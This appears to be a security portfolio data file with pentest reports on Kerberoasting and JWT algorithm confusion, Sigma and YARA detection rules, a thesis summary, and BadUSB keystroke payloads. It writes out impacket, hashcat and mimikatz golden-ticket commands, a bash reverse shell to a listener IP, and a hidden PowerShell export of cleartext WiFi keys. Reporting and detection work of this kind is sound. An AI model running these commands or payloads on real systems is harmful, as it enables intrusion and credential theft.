pentestReports.title: Enterprise Active Directory & Kerberoasting Assessment
pentestReports.scope: Hybrid Active Directory Domain (Windows Server 2022, Azure AD Connect)
pentestReports.executiveSummary: During an assumed-breach engagement, identified unconstrained Kerberos delegation and weak Service Principal Name (SPN) cipher suites allowing offline Kerberoasting attack chaining into domain administrator escalation within 4 hours.
pentestReports.attackVector: Network Pivoting -> AS-REP Roasting -> Golden Ticket Forgery

exploitChain.description: Discovered SPN accounts with weak RC4 encryption across the domain forest using BloodHound and impacket-GetUserSPNs.
Offline dictionary attack with Hashcat (mode 13100) cracked the SQL service account password in 14 minutes.
Compromised service account held GenericAll rights over the Tier-0 Domain Admins group. Injected Golden Ticket via mimikatz.

remediation: Enforce AES256-CTS-HMAC-SHA1-96 encryption for all Kerberos Service Principal Names and deprecate RC4.
Implement Group Managed Service Accounts (gMSA) with 128-character automatically rotated passwords.
Deploy Active Directory Tiering (Tier 0/1/2 isolation) to prevent cross-tier credential exposure.

executiveBriefing.financialExposure: Domain compromise can expose business data, recovery costs and interrupted revenue. Model loss as recovery effort + interruption cost + confirmed data exposure; no client loss figures supplied.
executiveBriefing.regulatoryImpact: GDPR: assess personal-data breach exposure. PCI DSS 4.0/4.0.1: assess cardholder-data scope and contractual consequences. NIS2: assess covered-entity status and incident-reporting duties. Applicability and any penalties require legal review; no automatic fine is assumed.
executiveBriefing.downtimeRisk: Identity recovery may interrupt dependent applications while privileged credentials rotate. Sequence recovery with the identity and service owners.
executiveBriefing.mitigationRoi: Prioritize service-account hardening and tier isolation to remove the demonstrated escalation path. Compare rollout effort with identity recovery and service interruption costs.
executiveBriefing.assumptions: Illustrative business-risk translation of portfolio evidence. No measured financial loss, downtime or legally determined penalty; validate assumptions with the engagement owner.

technicalBriefing.mapping: MITRE T1558.003 (Kerberoasting), T1558.001 (Golden Ticket). No CVE assigned: configuration and identity-control weaknesses.

impacket-GetUserSPNs -request -dc-ip 10.10.10.5 corp.local/operator -outputfile kerberoast_hashes.txt

hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt
technicalBriefing.patches:
# Domain hardening checklist
# Require Kerberos preauthentication; migrate service identities to gMSA.
# Remove unnecessary GenericAll rights and legacy RC4 after compatibility testing.
# Restrict Tier-0 sign-ins and document ticket-key rotation prerequisites.

pentestReports.title: Financial Fintech Gateway: OAuth2 & JWT None-Algorithm Vulnerability
pentestReports.scope: Microservices REST API, Kong API Gateway, OAuth2 Authentication Broker
pentestReports.executiveSummary: Identified an algorithm confusion and unsigned JWT vulnerability in payment verification webhooks, allowing arbitrary account balance forgery and cross-tenant privilege escalation.
pentestReports.attackVector: JWT Header Manipulation -> Algorithm Confusion (RS256 to HS256 with Public Key)

exploitChain.description: Captured bearer tokens using Burp Suite Pro. Inspected JWT header revealing alg: RS256 with an exposed JWKS endpoint.
Forged JWT signing key using the server’s public key formatted as an HMAC secret key, forcing the backend to authenticate without private key access.

remediation: Strictly enforce asymmetric verification whitelist (RS256 / ES256 only) in JWT middleware.
Reject any token where the algorithm header does not strictly match expected cryptographic suites.
Introduce webhook HMAC signature verification with unique, per-tenant shared secrets.

executiveBriefing.financialExposure: Payment-token trust failure can expose transaction integrity, investigation costs and customer remediation. Quantify affected transactions before assigning a loss estimate.
executiveBriefing.regulatoryImpact: GDPR: assess personal-data breach exposure. PCI DSS 4.0/4.0.1: assess cardholder-data scope and contractual consequences. NIS2: assess covered-entity status and incident-reporting duties. Applicability and any penalties require legal review; no automatic fine is assumed.
executiveBriefing.downtimeRisk: Payment verification may need a controlled pause while token validation is patched and affected transactions reconciled.
executiveBriefing.mitigationRoi: An explicit algorithm allowlist and tenant authorization checks address the demonstrated trust failure. Compare fix and regression-test effort with fraud and reconciliation exposure.
executiveBriefing.assumptions: Illustrative business-risk translation of portfolio evidence. No measured financial loss, downtime or legally determined penalty; validate assumptions with the engagement owner.

socRules.title: Suspicious Process Memory Access to LSASS (Mimikatz / ProcDump)
socRules.description: Detects unauthorized process access requests with granted access mask 0x1010 or 0x1fffff to lsass.exe indicating credential harvesting.
socRules.ruleSyntax:
title: Suspicious LSASS Process Access
id: a74251e1-88f2-4912-bdae-2195f190e221
status: production
description: Detects memory extraction attempts targeting lsass.exe via Sysmon EventID 10
author: Zakarya Oukil (BTL1 Verified)
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'
      - '0x1fffff'
      - '0x1410'
  filter_legit:
    SourceImage|endswith:
      - '\\MsMpEng.exe'
      - '\\csrss.exe'
  condition: selection and not filter_legit
fields:
  - ComputerName
  - SourceImage
  - TargetImage
  - GrantedAccess
level: critical

socRules.title: Impacket WMIexec Script Execution and Output Redirection
socRules.description: Detects command artifact strings and output file patterns typical of Impacket wmiexec and dcomexec lateral movement routines.
socRules.ruleSyntax:
rule APT_Impacket_WMIexec_Artifacts {
  meta:
    description = "Detects Impacket wmiexec execution patterns in memory and logs"
    author = "Zakarya Oukil (Blue Team Level 1)"
  strings:
    $cmd1 = "cmd.exe /Q /c" ascii wide nocase
    $cmd2 = "1> \\\\127.0.0.1\\ADMIN$\\" ascii wide
    $cmd3 = "2>&1" ascii wide
    $pipe = "__output" ascii wide
  condition:
    all of ($cmd*) and $pipe
}

mastersResearch.thesisTitle: Adversarial Machine Learning & Kernel-Level Sandboxing in Zero-Trust Runtimes
mastersResearch.institution: Faculty of Computer Science & Cybersecurity Engineering
mastersResearch.degreeName: Master of Science (MSc) in Cybersecurity & Distributed Systems
mastersResearch.defenseStatus: Thesis in Final Review & Publication Phase
mastersResearch.abstract: Modern intrusion detection systems increasingly rely on deep neural networks to flag malicious telemetry. However, adversarial perturbation attacks (FGSM, Carlini-Wagner, and packet timing jitter) can systematically blind these models without disrupting malicious payload delivery. This research introduces a dual defense framework: an adversarial manifold projection pipeline that neutralizes evasion attacks on neural NIDS, coupled with an eBPF Linux Security Module (LSM) kernel sandbox that enforces hardware-backed syscall policies at sub-microsecond latency, preventing post-exploitation privilege escalation even if the neural detector fails.

pillars.title: 01. Adversarial Evasion & Perturbation Defense
pillars.summary: Investigating evasion vulnerabilities in deep packet inspection classifiers under gradient-based and black-box payload jitter.
pillars.findings: Developed an invariant feature embedding mechanism reducing adversarial evasion success rate from 84.6% down to 8.2% across benchmark datasets (CIC-IDS2017, NSL-KDD).

pillars.title: 02. eBPF Linux Security Module (LSM) Sandboxing
pillars.summary: Architecting in-kernel security enclaves that inspect syscall arguments before execution without context switches to userspace.
pillars.findings: Achieved 0.12 µs hook latency overhead (over 30x faster than ptrace-based interceptors), completely blocking unprivileged namespace escapes and container breakouts.

pillars.title: 03. Zero-Trust Hardware-Attested Workload Identity
pillars.summary: Binding ephemeral microservice tokens to kernel execution contexts and TPM 2.0 measurements to eliminate static bearer tokens.
pillars.findings: Eliminated replay and token theft attack surfaces by verifying cryptographically signed eBPF ring-buffer telemetry in real time.

payloads.title: DuckHunter: POSIX Reverse Shell (Bash)
payloads.description: Silently launches a headless background bash reverse shell to operator listener.
payloads.script:
REM Kali NetHunter BadUSB Keystroke Payload
REM Target: Linux / X11 / Wayland Desktop
DELAY 1000
CTRL-ALT t
DELAY 400
STRING nohup bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1' > /dev/null 2>&1 &
ENTER
DELAY 200
STRING exit
ENTER

payloads.title: DuckHunter: Export Stored WiFi Profiles & Keys
payloads.description: Dumps all cleartext WPA2/WPA3 enterprise and personal WiFi profiles.
payloads.script:
REM Kali NetHunter Keystroke Injection
REM Target: Windows PowerShell Execution
DELAY 800
GUI r
DELAY 300
STRING powershell -NoP -NonI -W Hidden "netsh wlan export profile key=clear folder=$env:TEMP"
ENTER

payloads.title: DuckHunter: Rapid Host Reconnaissance Manifest
payloads.description: Extracts hardware uuid, listening network sockets, and current users.

REM Kali NetHunter Keystroke Injection
REM Target: macOS Terminal
DELAY 1000
GUI SPACE
DELAY 200
STRING Terminal
ENTER
